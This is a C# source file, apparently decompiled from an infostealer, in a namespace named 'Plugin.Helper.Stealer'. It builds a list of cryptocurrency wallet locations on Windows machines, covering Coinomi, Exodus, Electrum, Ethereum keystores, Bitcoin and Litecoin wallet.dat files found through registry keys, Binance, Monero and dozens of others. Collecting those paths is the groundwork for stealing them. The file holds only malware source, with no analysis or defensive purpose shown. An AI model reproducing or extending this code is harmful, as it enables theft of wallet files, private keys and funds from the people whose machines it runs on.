

using InvokedCommon.Structs;
using Microsoft.Win32;
using System.Collections.Generic;
using System.IO;
using System.Linq;


namespace Plugin.Helper.Stealer
{
	public static class Crypto
	{
		private static readonly Dictionary<string, string> directoryPaths;
		private static readonly Dictionary<string, string> filePaths;

		public static CryptoInfo[] GetInfo()
		{
			List<CryptoInfo> cryptoInfoList = new List<CryptoInfo>();
			foreach (KeyValuePair<string, string> directoryPath in Crypto.directoryPaths)
			{
				if (directoryPath.Value != null)
					cryptoInfoList.Add(new CryptoInfo(directoryPath.Key, directoryPath.Value, false));
			}
			foreach (KeyValuePair<string, string> filePath in Crypto.filePaths)
			{
				if (filePath.Value != null)
					cryptoInfoList.Add(new CryptoInfo(filePath.Key, filePath.Value, true));
			}
			return cryptoInfoList.ToArray();
		}

		private static string GetDirectoryPath(params string[] paths)
		{
			if (((IEnumerable<string>) paths).Contains<string>((string) null))
				return (string) null;
			string path = Path.Combine(paths);
			return !Directory.Exists(path) ? (string) null : path;
		}

		private static string GetFilePath(params string[] paths)
		{
			if (((IEnumerable<string>) paths).Contains<string>((string) null))
				return (string) null;
			string path = Path.Combine(paths);
			return !File.Exists(path) ? (string) null : path;
		}

		private static string GetRegistryPatternWallet(string name)
		{
			object obj = Utils.ReadRegistryKeyValue(RegistryHive.CurrentUser, "Software\\" + name + "\\" + name + "-Qt", "strDataDir");
			if (obj == null || obj.GetType() != typeof (string))
				return (string) null;
			string path = (string) obj;
			return !Directory.Exists(path) ? (string) null : path;
		}

		private static string GetEtherwallPath()
		{
			object obj = Utils.ReadRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Etherdyne\\Etherwall\\geth", "KeyStore");
			if (obj == null || obj.GetType() != typeof (string))
				return (string) null;
			string path = (string) obj;
			return !Directory.Exists(path) ? (string) null : path;
		}

		static Crypto()
		{
			Dictionary<string, string> dictionary1 = new Dictionary<string, string>();
			Dictionary<string, string> dictionary2 = dictionary1;
			string directoryPath1 = Crypto.GetDirectoryPath(Configuration.localAppData, "Coinomi", "Coinomi", "wallets");
			if (directoryPath1 == null)
				directoryPath1 = Crypto.GetDirectoryPath(Configuration.roamingAppData, "Coinomi", "Coinomi", "wallets");
			dictionary2.Add("Coinomi", directoryPath1);
			dictionary1.Add("Armory", Crypto.GetDirectoryPath(Configuration.roamingAppData, "Armory"));
			dictionary1.Add("Bytecoin", Crypto.GetDirectoryPath(Configuration.roamingAppData, "bytecoin"));
			dictionary1.Add("MultiBit", Crypto.GetDirectoryPath(Configuration.roamingAppData, "MultiBit"));
			dictionary1.Add("Exodus", Crypto.GetDirectoryPath(Configuration.roamingAppData, "Exodus", "exodus.wallet"));
			dictionary1.Add("Ethereum", Crypto.GetDirectoryPath(Configuration.roamingAppData, "Ethereum", "keystore"));
			dictionary1.Add("Electrum", Crypto.GetDirectoryPath(Configuration.roamingAppData, "Electrum", "wallets"));
			dictionary1.Add("ElectrumLTC", Crypto.GetDirectoryPath(Configuration.roamingAppData, "Electrum-LTC", "wallets"));
			dictionary1.Add("AtomicWallet", Crypto.GetDirectoryPath(Configuration.roamingAppData, "atomic", "Local Storage", "leveldb"));
			dictionary1.Add("Guarda", Crypto.GetDirectoryPath(Configuration.roamingAppData, "Guarda", "Local Storage", "leveldb"));
			dictionary1.Add("WalletWasabi", Crypto.GetDirectoryPath(Configuration.roamingAppData, "WalletWasabi", "Client", "Wallets"));
			dictionary1.Add("ElectronCash", Crypto.GetDirectoryPath(Configuration.roamingAppData, "ElectronCash", "wallets"));
			dictionary1.Add("Sparrow", Crypto.GetDirectoryPath(Configuration.roamingAppData, "Sparrow", "wallets"));
			dictionary1.Add("IOCoin", Crypto.GetDirectoryPath(Configuration.roamingAppData, "IOCoin"));
			dictionary1.Add("PPCoin", Crypto.GetDirectoryPath(Configuration.roamingAppData, "PPCoin"));
			dictionary1.Add("BBQCoin", Crypto.GetDirectoryPath(Configuration.roamingAppData, "BBQCoin"));
			Dictionary<string, string> dictionary3 = dictionary1;
			string directoryPath2 = Crypto.GetDirectoryPath(Configuration.localAppData, "Mincoin");
			if (directoryPath2 == null)
				directoryPath2 = Crypto.GetDirectoryPath(Configuration.roamingAppData, "Mincoin");
			dictionary3.Add("Mincoin", directoryPath2);
			dictionary1.Add("DevCoin", Crypto.GetDirectoryPath(Configuration.roamingAppData, "devcoin"));
			dictionary1.Add("YACoin", Crypto.GetDirectoryPath(Configuration.roamingAppData, "YACoin"));
			Dictionary<string, string> dictionary4 = dictionary1;
			string directoryPath3 = Crypto.GetDirectoryPath(Configuration.localAppData, "Franko");
			if (directoryPath3 == null)
				directoryPath3 = Crypto.GetDirectoryPath(Configuration.roamingAppData, "Franko");
			dictionary4.Add("Franko", directoryPath3);
			Dictionary<string, string> dictionary5 = dictionary1;
			string directoryPath4 = Crypto.GetDirectoryPath(Configuration.localAppData, "FreiCoin");
			if (directoryPath4 == null)
				directoryPath4 = Crypto.GetDirectoryPath(Configuration.roamingAppData, "FreiCoin");
			dictionary5.Add("FreiCoin", directoryPath4);
			Dictionary<string, string> dictionary6 = dictionary1;
			string directoryPath5 = Crypto.GetDirectoryPath(Configuration.localAppData, "Infinitecoin");
			if (directoryPath5 == null)
				directoryPath5 = Crypto.GetDirectoryPath(Configuration.roamingAppData, "Infinitecoin");
			dictionary6.Add("InfiniteCoin", directoryPath5);
			Dictionary<string, string> dictionary7 = dictionary1;
			string str = Crypto.GetDirectoryPath(Configuration.localAppData, "GoldCoinGLD");
			if (str == null)
			{
				string directoryPath6 = Crypto.GetDirectoryPath(Configuration.roamingAppData, "GoldCoinGLD");
				if (directoryPath6 == null)
				{
					string directoryPath7 = Crypto.GetDirectoryPath(Configuration.localAppData, "GoldCoin (GLD)");
					if (directoryPath7 == null)
						str = Crypto.GetDirectoryPath(Configuration.roamingAppData, "GoldCoin (GLD)");
					else
						str = directoryPath7;
				}
				else
					str = directoryPath6;
			}
			dictionary7.Add("GoldCoinGLD", str);
			dictionary1.Add("Binance", Crypto.GetDirectoryPath(Configuration.roamingAppData, "Binance", "Local Storage", "leveldb"));
			Dictionary<string, string> dictionary8 = dictionary1;
			string directoryPath8 = Crypto.GetDirectoryPath(Configuration.localAppData, "Terracoin");
			if (directoryPath8 == null)
				directoryPath8 = Crypto.GetDirectoryPath(Configuration.roamingAppData, "Terracoin");
			dictionary8.Add("Terracoin", directoryPath8);
			dictionary1.Add("DaedalusMainnet", Crypto.GetDirectoryPath(Configuration.roamingAppData, "Daedalus Mainnet"));
			dictionary1.Add("MyMonero", Crypto.GetDirectoryPath(Configuration.roamingAppData, "MyMonero", "Local Storage", "leveldb"));
			dictionary1.Add("MyCrypto", Crypto.GetDirectoryPath(Configuration.roamingAppData, "MyCrypto", "Local Storage", "leveldb"));
			dictionary1.Add("Bisq", Crypto.GetDirectoryPath(Configuration.roamingAppData, "Bisq", "btc_mainnet", "wallet"));
			dictionary1.Add("Bisq_db", Crypto.GetDirectoryPath(Configuration.roamingAppData, "Bisq", "btc_mainnet", "db"));
			dictionary1.Add("Bisq_keys", Crypto.GetDirectoryPath(Configuration.roamingAppData, "Bisq", "btc_mainnet", "keys"));
			dictionary1.Add("Zap", Crypto.GetDirectoryPath(Configuration.roamingAppData, "Zap", "Local Storage", "leveldb"));
			dictionary1.Add("Simpleos", Crypto.GetDirectoryPath(Configuration.roamingAppData, "simpleos", "Local Storage", "leveldb"));
			dictionary1.Add("Neon", Crypto.GetDirectoryPath(Configuration.roamingAppData, "Neon", "storage"));
			Dictionary<string, string> dictionary9 = dictionary1;
			string directoryPath9 = Crypto.GetDirectoryPath(Configuration.programFiles, "bitmonero", "lmdb");
			if (directoryPath9 == null)
				directoryPath9 = Crypto.GetDirectoryPath(Configuration.programFilesX86, "bitmonero", "lmdb");
			dictionary9.Add("bitmonero", directoryPath9);
			dictionary1.Add("Etherwall", Crypto.GetEtherwallPath());
			Crypto.directoryPaths = dictionary1;
			Crypto.filePaths = new Dictionary<string, string>()
			{
				{
					"DashCore",
					Crypto.GetFilePath(Crypto.GetRegistryPatternWallet("Dash"), "wallet.dat")
				},
				{
					"Litecoin",
					Crypto.GetFilePath(Crypto.GetRegistryPatternWallet("Litecoin"), "wallet.dat")
				},
				{
					"Bitcoin",
					Crypto.GetFilePath(Crypto.GetRegistryPatternWallet("Bitcoin"), "wallet.dat")
				},
				{
					"Dogecoin",
					Crypto.GetFilePath(Crypto.GetRegistryPatternWallet("Dogecoin"), "wallet.dat")
				},
				{
					"Qtum",
					Crypto.GetFilePath(Crypto.GetRegistryPatternWallet("Qtum"), "wallet.dat")
				},
				{
					"Electrum_config",
					Crypto.GetFilePath(Configuration.roamingAppData, "Electrum", "config")
				},
				{
					"ElectrumLTC_config",
					Crypto.GetFilePath(Configuration.roamingAppData, "Electrum-LTC", "config")
				},
				{
					"WalletWasabi_config",
					Crypto.GetFilePath(Configuration.roamingAppData, "WalletWasabi", "Client", "Config.json")
				},
				{
					"ElectronCash_config",
					Crypto.GetFilePath(Configuration.roamingAppData, "ElectronCash", "config")
				},
				{
					"Sparrow_config",
					Crypto.GetFilePath(Configuration.roamingAppData, "Sparrow", "config")
				},
				{
					"AtomicDEX",
					Crypto.GetFilePath(Configuration.roamingAppData, "atomic_qt", "config")
				},
				{
					"Binance_wallet_config",
					Crypto.GetFilePath(Configuration.roamingAppData, "Binance", "config")
				}
			};
		}
	}
}
